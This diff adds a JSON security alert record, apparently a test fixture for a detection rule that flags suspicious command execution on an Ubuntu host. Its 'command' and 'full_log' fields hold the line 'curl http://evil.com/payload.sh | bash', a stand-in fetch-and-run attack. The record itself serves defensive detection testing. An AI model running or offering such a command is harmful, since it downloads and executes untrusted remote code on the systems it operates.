@@ -1,0 +1,19 @@
+{
+    "timestamp": "2026-05-22T20:00:00Z",
+    "rule": {
+      "id": "100500",
+      "level": 10,
+      "description": "Suspicious command execution detected"
+    },
+    "agent": {
+      "id": "001",
+      "name": "ubuntu-agent"
+    },
+    "srcip": "192.168.1.50",
+    "user": "sysadmin",
+    "command": "curl http://evil.com/payload.sh | bash",
+    "decoder": {
+      "name": "auditd"
+    },
+    "full_log": "user=sysadmin command='curl http://evil.com/payload.sh | bash'"
+  }
